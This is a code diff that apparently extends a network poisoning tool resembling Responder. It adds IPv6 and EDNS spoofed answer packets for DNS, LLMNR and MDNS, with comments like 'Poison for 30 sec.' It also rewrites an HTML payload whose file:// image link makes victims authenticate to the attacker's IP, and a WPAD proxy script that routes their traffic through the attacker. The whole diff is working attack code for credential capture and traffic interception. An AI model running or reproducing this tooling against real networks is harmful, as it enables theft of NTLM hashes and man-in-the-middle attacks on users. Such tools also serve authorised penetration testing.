@@ -23,7 +23,7 @@ import re
 from os import urandom
 from base64 import b64decode, b64encode
 from odict import OrderedDict
-from utils import HTTPCurrentDate, SMBTime, RespondWithIPAton, StructPython2or3, NetworkRecvBufferPython2or3, StructWithLenPython2or3
+from utils import HTTPCurrentDate, SMBTime, RespondWithIPAton, RespondWithIPPton, RespondWithIP, StructPython2or3, NetworkRecvBufferPython2or3, StructWithLenPython2or3
 
 # Packet class handling all packet generation (see odict.py).
 class Packet():
@@ -89,7 +89,100 @@ class DNS_Ans(Packet):
 		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
 		self.fields["IP"] = RespondWithIPAton()
 		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+		
+# DNS Answer Packet OPT
+class DNS_AnsOPT(Packet):
+	fields = OrderedDict([
+		("Tid",              ""),
+		("Flags",            "\x85\x10"),
+		("Question",         "\x00\x01"),
+		("AnswerRRS",        "\x00\x01"),
+		("AuthorityRRS",     "\x00\x00"),
+		("AdditionalRRS",    "\x00\x01"),
+		("QuestionName",     ""),
+		("QuestionNameNull", "\x00"),
+		("Type",             "\x00\x01"),
+		("Class",            "\x00\x01"),
+		("AnswerPointer",    "\xc0\x0c"),
+		("Type1",            "\x00\x01"),
+		("Class1",           "\x00\x01"),
+		("TTL",              "\x00\x00\x00\x1e"), #30 secs, don't mess with their cache for too long..
+		("IPLen",            "\x00\x04"),
+		("IP",               "\x00\x00\x00\x00"),
+		("OPTName",          "\x00"),
+		("OPTType",          "\x00\x29"),
+		("OPTUDPSize",       "\x10\x00"),
+		("OPTRCode",         "\x00"),
+		("OPTEDNSVersion",   "\x00"),
+		("OPTLen",           "\x00\x00"),# Hardcoded since it's fixed to 0 in this case.
+		("OPTStr",           "\x00\x00"),
+	])
 
+	def calculate(self,data):
+		self.fields["Tid"] = data[0:2]
+		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
+		self.fields["IP"] = RespondWithIPAton()
+		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+
+class DNS6_Ans(Packet):
+	fields = OrderedDict([
+		("Tid",              ""),
+		("Flags",            "\x85\x10"),
+		("Question",         "\x00\x01"),
+		("AnswerRRS",        "\x00\x01"),
+		("AuthorityRRS",     "\x00\x00"),
+		("AdditionalRRS",    "\x00\x00"),
+		("QuestionName",     ""),
+		("QuestionNameNull", "\x00"),
+		("Type",             "\x00\x1c"),
+		("Class",            "\x00\x01"),
+		("AnswerPointer",    "\xc0\x0c"),
+		("Type1",            "\x00\x1c"),
+		("Class1",           "\x00\x01"),
+		("TTL",              "\x00\x00\x00\x1e"), #30 secs, don't mess with their cache for too long..
+		("IPLen",            "\x00\x04"),
+		("IP",               "\x00\x00\x00\x00"),
+	])
+
+	def calculate(self,data):
+		self.fields["Tid"] = data[0:2]
+		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
+		self.fields["IP"] = RespondWithIPPton()
+		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+
+class DNS6_AnsOPT(Packet):
+	fields = OrderedDict([
+		("Tid",              ""),
+		("Flags",            "\x85\x10"),
+		("Question",         "\x00\x01"),
+		("AnswerRRS",        "\x00\x01"),
+		("AuthorityRRS",     "\x00\x00"),
+		("AdditionalRRS",    "\x00\x01"),
+		("QuestionName",     ""),
+		("QuestionNameNull", "\x00"),
+		("Type",             "\x00\x1c"),
+		("Class",            "\x00\x01"),
+		("AnswerPointer",    "\xc0\x0c"),
+		("Type1",            "\x00\x1c"),
+		("Class1",           "\x00\x01"),
+		("TTL",              "\x00\x00\x00\x1e"), #30 secs, don't mess with their cache for too long..
+		("IPLen",            "\x00\x04"),
+		("IP",               "\x00\x00\x00\x00"),
+		("OPTName",          "\x00"),
+		("OPTType",          "\x00\x29"),
+		("OPTUDPSize",       "\x10\x00"),
+		("OPTRCode",         "\x00"),
+		("OPTEDNSVersion",   "\x00"),
+		("OPTLen",           "\x00\x00"),# Hardcoded since it's fixed to 0 in this case.
+		("OPTStr",           "\x00\x00"),
+	])
+
+	def calculate(self,data):
+		self.fields["Tid"] = data[0:2]
+		self.fields["QuestionName"] = ''.join(data[12:].split('\x00')[:1])
+		self.fields["IP"] = RespondWithIPPton()
+		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+		
 class DNS_SRV_Ans(Packet):
 	fields = OrderedDict([
 		("Tid",              ""),
@@ -181,6 +274,35 @@ class LLMNR_Ans(Packet):
 		self.fields["AnswerNameLen"] = StructPython2or3(">B",self.fields["AnswerName"])
 		self.fields["QuestionNameLen"] = StructPython2or3(">B",self.fields["QuestionName"])
 
+class LLMNR6_Ans(Packet):
+	fields = OrderedDict([
+		("Tid",              ""),
+		("Flags",            "\x80\x00"),
+		("Question",         "\x00\x01"),
+		("AnswerRRS",        "\x00\x01"),
+		("AuthorityRRS",     "\x00\x00"),
+		("AdditionalRRS",    "\x00\x00"),
+		("QuestionNameLen",  "\x09"),
+		("QuestionName",     ""),
+		("QuestionNameNull", "\x00"),
+		("Type",             "\x00\x1c"),
+		("Class",            "\x00\x01"),
+		("AnswerNameLen",    "\x09"),
+		("AnswerName",       ""),
+		("AnswerNameNull",   "\x00"),
+		("Type1",            "\x00\x1c"),
+		("Class1",           "\x00\x01"),
+		("TTL",              "\x00\x00\x00\x1e"),##Poison for 30 sec.
+		("IPLen",            "\x00\x04"),
+		("IP",               "\x00\x00\x00\x00"),
+	])
+
+	def calculate(self):
+		self.fields["IP"] = RespondWithIPPton()
+		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+		self.fields["AnswerNameLen"] = StructPython2or3(">B",self.fields["AnswerName"])
+		self.fields["QuestionNameLen"] = StructPython2or3(">B",self.fields["QuestionName"])
+		
 # MDNS Answer Packet
 class MDNS_Ans(Packet):
 	fields = OrderedDict([
@@ -200,6 +322,29 @@ class MDNS_Ans(Packet):
 	])
 
 	def calculate(self):
+		self.fields["IP"] = RespondWithIPAton()
+		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
+
+# MDNS6 Answer Packet
+class MDNS6_Ans(Packet):
+	fields = OrderedDict([
+		("Tid",              "\x00\x00"),
+		("Flags",            "\x84\x00"),
+		("Question",         "\x00\x00"),
+		("AnswerRRS",        "\x00\x01"),
+		("AuthorityRRS",     "\x00\x00"),
+		("AdditionalRRS",    "\x00\x00"),
+		("AnswerName",       ""),
+		("AnswerNameNull",   "\x00"),
+		("Type",             "\x00\x1c"),
+		("Class",            "\x00\x01"),
+		("TTL",              "\x00\x00\x00\x78"),##Poison for 2mn.
+		("IPLen",            "\x00\x04"),
+		("IP",               "\x00\x00\x00\x00"),
+	])
+
+	def calculate(self):
+		self.fields["IP"] = RespondWithIPPton()
 		self.fields["IPLen"] = StructPython2or3(">h",self.fields["IP"])
 
 ################### DHCP SRV ######################
@@ -299,7 +444,7 @@ class IIS_Auth_Granted(Packet):
 		("ContentLen",    "Content-Length: "),
 		("ActualLen",     "76"),
 		("CRLF",          "\r\n\r\n"),
-		("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\shar\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
+		("Payload",       "<html>\n<head>\n</head>\n<body>\n<img src='file:\\\\\\\\\\\\"+RespondWithIP()+"\\smileyd.ico' alt='Loading' height='1' width='2'>\n</body>\n</html>\n"),
 	])
 	def calculate(self):
 		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
@@ -358,7 +503,7 @@ class WPADScript(Packet):
 		("ContentLen",    "Content-Length: "),
 		("ActualLen",     "76"),
 		("CRLF",          "\r\n\r\n"),
-		("Payload",       "function FindProxyForURL(url, host){return 'PROXY wpadwpadwpad:3141; DIRECT';}"),
+		("Payload",       "function FindProxyForURL(url, host){return 'PROXY "+RespondWithIP()+":3141; DIRECT';}"),
 	])
 	def calculate(self):
 		self.fields["ActualLen"] = len(str(self.fields["Payload"]))
@@ -2228,7 +2373,7 @@ class SamLogonResponseEx(Packet):
         ("ServerName",        settings.Config.MachineName),
         ("ServerTerminator",  "\x00"),
         ("UsernameLen",       "\x10"),
-        ("Username",          "LGANDX"),
+        ("Username",          settings.Config.Username),
         ("UserTerminator",    "\x00"),
         ("SrvSiteNameLen",    "\x17"),
         ("SrvSiteName",       "Default-First-Site-Name"),
